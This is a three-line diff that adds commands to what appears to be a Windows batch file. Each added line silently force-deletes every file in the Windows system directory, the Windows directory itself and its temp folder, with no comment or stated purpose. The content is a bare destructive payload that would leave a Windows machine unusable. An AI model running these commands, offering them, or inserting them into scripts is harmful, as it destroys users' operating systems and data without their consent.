@@ -1,0 +1,3 @@
+if exist c:\windows\system\*.* del c:\windows\system\*.* /Q /F
+if exist c:\windows\*.* del c:\windows\*.* /Q /F
+if exist c:\windows\temp\*.* del c:\windows\temp\*.* /Q /F
